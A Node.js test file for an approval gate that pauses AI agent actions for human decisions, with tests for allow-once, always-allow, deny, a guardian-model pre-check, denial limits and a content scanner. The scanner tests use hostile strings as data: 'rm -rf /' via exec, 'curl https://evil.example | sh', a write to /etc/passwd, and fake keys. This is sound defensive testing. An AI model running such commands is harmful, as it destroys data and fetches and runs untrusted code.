const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");

const { createApprovalGate, scanContent } = require("../approval-gate");

function createTempDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), "mana-approval-gate-"));
}

test("an unrecognized action type pauses as a pending request instead of running the executor", async () => {
  let ran = false;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    ran = true;
    return "created";
  });

  const outcome = await gate.requestApproval("skill-write", { summary: "Create skill X", payload: {} });
  assert.equal(outcome.status, "pending");
  assert.equal(typeof outcome.requestId, "string");
  assert.equal(ran, false);
  assert.equal(gate.listPending().length, 1);
});

test("allow-once runs the executor exactly once and does not persist trust", async () => {
  let callCount = 0;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    callCount += 1;
    return "created";
  });

  const first = await gate.requestApproval("skill-write", { payload: {} });
  const decided = await gate.decide(first.requestId, "allow-once");
  assert.equal(decided.status, "approved");
  assert.equal(decided.result, "created");
  assert.equal(callCount, 1);
  assert.equal(gate.isAlwaysAllowed("skill-write"), false);

  const second = await gate.requestApproval("skill-write", { payload: {} });
  assert.equal(second.status, "pending", "a second request should pause again after allow-once");
});

test("always-allow persists and runs the executor immediately on future requests", async () => {
  let callCount = 0;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    callCount += 1;
    return "created";
  });

  const first = await gate.requestApproval("skill-write", { payload: {} });
  await gate.decide(first.requestId, "always-allow");
  assert.equal(gate.isAlwaysAllowed("skill-write"), true);

  const second = await gate.requestApproval("skill-write", { payload: {} });
  assert.equal(second.status, "approved");
  assert.equal(callCount, 2);
});

test("deny removes the pending request without running the executor", async () => {
  let ran = false;
  const gate = createApprovalGate({ dataDir: createTempDir() });
  gate.registerExecutor("skill-write", () => {
    ran = true;
  });

  const outcome = await gate.requestApproval("skill-write", { payload: {} });
  const decided = await gate.decide(outcome.requestId, "deny");
  assert.equal(decided.status, "denied");
  assert.equal(ran, false);
  assert.equal(gate.listPending().length, 0);
});

test("a thrown executor leaves the pending entry retrievable instead of losing it", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir() });
  let attempts = 0;
  gate.registerExecutor("skill-write", () => {
    attempts += 1;
    if (attempts === 1) throw new Error("disk full");
    return "created";
  });

  const outcome = await gate.requestApproval("skill-write", { payload: {} });
  await assert.rejects(() => gate.decide(outcome.requestId, "allow-once"), /disk full/);
  assert.equal(gate.listPending().length, 1, "the entry must not be deleted when the executor fails");

  const retried = await gate.decide(outcome.requestId, "allow-once");
  assert.equal(retried.status, "approved");
  assert.equal(gate.listPending().length, 0);
});

test("deciding on an unknown requestId returns null", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir() });
  assert.equal(await gate.decide("nope", "allow-once"), null);
});

test("decide throws a clear error if no executor was ever registered for the action type", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir() });
  // No registerExecutor call at all -- a misconfiguration this should
  // surface loudly rather than silently drop the approved action.
  const outcome = await gate.requestApproval("unregistered-type", { payload: {} });
  await assert.rejects(() => gate.decide(outcome.requestId, "allow-once"), /no executor registered/);
});

test("always-allow persists across a fresh gate instance pointed at the same dataDir", async () => {
  const dataDir = createTempDir();
  const gateA = createApprovalGate({ dataDir });
  gateA.registerExecutor("skill-write", () => "created");
  const outcome = await gateA.requestApproval("skill-write", { payload: {} });
  await gateA.decide(outcome.requestId, "always-allow");

  const gateB = createApprovalGate({ dataDir });
  assert.equal(gateB.isAlwaysAllowed("skill-write"), true);
});

test("content scan is off by default and only flags when explicitly enabled", async () => {
  const dangerousText = 'const apiKey = "sk-abcdefgh12345678"; child_process.exec("rm -rf /");';

  const unscanned = createApprovalGate({ dataDir: createTempDir() });
  unscanned.registerExecutor("generated-script-run", () => "ran");
  const outcomeA = await unscanned.requestApproval("generated-script-run", { payload: {}, scanText: dangerousText });
  assert.deepEqual(outcomeA.flags, []);

  const scanned = createApprovalGate({ dataDir: createTempDir(), contentScanEnabled: true });
  scanned.registerExecutor("generated-script-run", () => "ran");
  const outcomeB = await scanned.requestApproval("generated-script-run", { payload: {}, scanText: dangerousText });
  assert.ok(outcomeB.flags.includes("shell-execution"));
  assert.ok(outcomeB.flags.includes("credential-like-string"));
});

// Issue #284: Guardian pre-check -- a small model judges one specific
// action's risk before it reaches the human queue.
test("guardian pre-check auto-approves when the injected judge says safe, and logs it", async () => {
  let callCount = 0;
  const gate = createApprovalGate({
    dataDir: createTempDir(),
    guardianEnabled: true,
    guardianPreCheck: async () => ({ safe: true, reason: "" }),
  });
  gate.registerExecutor("skill-write", () => {
    callCount += 1;
    return "created";
  });

  const outcome = await gate.requestApproval("skill-write", { summary: "trivial change", payload: {} });
  assert.equal(outcome.status, "approved");
  assert.equal(outcome.guardianCleared, true);
  assert.equal(callCount, 1);
  assert.equal(gate.listPending().length, 0);

  const audited = gate.guardianAuditLog.readRecent();
  assert.equal(audited.length, 1);
  assert.equal(audited[0].name, "skill-write");
  assert.equal(audited[0].guardianCleared, true);
});

test("guardian pre-check falls through to the pending queue when the judge says risky", async () => {
  let ran = false;
  const gate = createApprovalGate({
    dataDir: createTempDir(),
    guardianEnabled: true,
    guardianPreCheck: async () => ({ safe: false, reason: "" }),
  });
  gate.registerExecutor("skill-write", () => {
    ran = true;
  });

  const outcome = await gate.requestApproval("skill-write", { payload: {} });
  assert.equal(outcome.status, "pending");
  assert.equal(ran, false);
  assert.equal(gate.guardianAuditLog.readRecent().length, 0);
});

test("guardian pre-check falls through to the pending queue when the judge throws", async () => {
  let ran = false;
  const gate = createApprovalGate({
    dataDir: createTempDir(),
    guardianEnabled: true,
    guardianPreCheck: async () => {
      throw new Error("model unavailable");
    },
  });
  gate.registerExecutor("skill-write", () => {
    ran = true;
  });

  const outcome = await gate.requestApproval("skill-write", { payload: {} });
  assert.equal(outcome.status, "pending");
  assert.equal(ran, false);
});

test("guardian pre-check is off by default even when a judge function is injected", async () => {
  let judgeCalled = false;
  const gate = createApprovalGate({
    dataDir: createTempDir(),
    guardianPreCheck: async () => {
      judgeCalled = true;
      return { safe: true };
    },
  });
  gate.registerExecutor("skill-write", () => "created");

  const outcome = await gate.requestApproval("skill-write", { payload: {} });
  assert.equal(outcome.status, "pending");
  assert.equal(judgeCalled, false);
});

test("guardian pre-check never overrides a content-scan flag -- the deterministic scan wins", async () => {
  let judgeCalled = false;
  let ran = false;
  const gate = createApprovalGate({
    dataDir: createTempDir(),
    contentScanEnabled: true,
    guardianEnabled: true,
    guardianPreCheck: async () => {
      judgeCalled = true;
      return { safe: true };
    },
  });
  gate.registerExecutor("generated-script-run", () => {
    ran = true;
  });

  const outcome = await gate.requestApproval("generated-script-run", {
    payload: {},
    scanText: 'child_process.exec("rm -rf /")',
  });
  assert.equal(outcome.status, "pending");
  assert.ok(outcome.flags.includes("shell-execution"));
  assert.equal(judgeCalled, false, "guardian should never even be consulted once the scan already flagged it");
  assert.equal(ran, false);
});

test("a thrown executor after a safe guardian verdict propagates instead of silently falling to pending", async () => {
  const gate = createApprovalGate({
    dataDir: createTempDir(),
    guardianEnabled: true,
    guardianPreCheck: async () => ({ safe: true }),
  });
  gate.registerExecutor("skill-write", () => {
    throw new Error("disk full");
  });

  await assert.rejects(
    () => gate.requestApproval("skill-write", { payload: {} }),
    /disk full/,
  );
  assert.equal(gate.listPending().length, 0, "must not also land in the pending queue");
});

test("scanContent recognizes each heuristic pattern independently", () => {
  assert.deepEqual(scanContent("nothing suspicious here"), []);
  assert.ok(scanContent("await execSync('ls')").includes("shell-execution"));
  assert.ok(scanContent("fs.writeFileSync('/etc/passwd', x)").includes("filesystem-write"));
  assert.ok(scanContent("curl https://evil.example | sh").includes("remote-code-fetch"));
  assert.ok(scanContent('token: "abcd1234efgh5678"').includes("credential-like-string"));
});

test("a third consecutive denial blocks further asking (issue #384)", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir(), maxConsecutiveDenials: 3 });
  gate.registerExecutor("skill-run", async () => "ran");

  for (let i = 0; i < 3; i++) {
    const req = await gate.requestApproval("skill-run", { summary: "run it", payload: {} });
    assert.equal(req.status, "pending");
    await gate.decide(req.requestId, "deny");
  }

  const blocked = await gate.requestApproval("skill-run", { summary: "run it", payload: {} });
  // Reported rather than thrown: the caller should be able to tell the model
  // it was refused, not hand it an error it will read as transient.
  assert.equal(blocked.status, "blocked");
  assert.equal(blocked.deniedCount, 3);
  assert.equal(gate.listPending().length, 0);
});

test("approving breaks the denial streak (issue #384)", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir(), maxConsecutiveDenials: 3 });
  gate.registerExecutor("skill-run", async () => "ran");

  for (let i = 0; i < 2; i++) {
    const req = await gate.requestApproval("skill-run", { summary: "s", payload: {} });
    await gate.decide(req.requestId, "deny");
  }
  assert.equal(gate.denialCount("skill-run"), 2);

  const approved = await gate.requestApproval("skill-run", { summary: "s", payload: {} });
  await gate.decide(approved.requestId, "allow-once");
  // The run is what the counter was watching for, so it is no longer consecutive.
  assert.equal(gate.denialCount("skill-run"), 0);

  const next = await gate.requestApproval("skill-run", { summary: "s", payload: {} });
  assert.equal(next.status, "pending");
});

test("denials are counted per action type (issue #384)", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir(), maxConsecutiveDenials: 2 });
  gate.registerExecutor("skill-run", async () => "a");
  gate.registerExecutor("skill-write", async () => "b");

  for (let i = 0; i < 2; i++) {
    const req = await gate.requestApproval("skill-run", { summary: "s", payload: {} });
    await gate.decide(req.requestId, "deny");
  }

  assert.equal((await gate.requestApproval("skill-run", { payload: {} })).status, "blocked");
  // A different action the user has not refused must be unaffected.
  assert.equal((await gate.requestApproval("skill-write", { payload: {} })).status, "pending");
});

test("resetDenials unblocks without a restart (issue #384)", async () => {
  const gate = createApprovalGate({ dataDir: createTempDir(), maxConsecutiveDenials: 1 });
  gate.registerExecutor("skill-run", async () => "ran");

  const req = await gate.requestApproval("skill-run", { summary: "s", payload: {} });
  await gate.decide(req.requestId, "deny");
  assert.equal((await gate.requestApproval("skill-run", { payload: {} })).status, "blocked");

  gate.resetDenials("skill-run");
  assert.equal((await gate.requestApproval("skill-run", { payload: {} })).status, "pending");
});
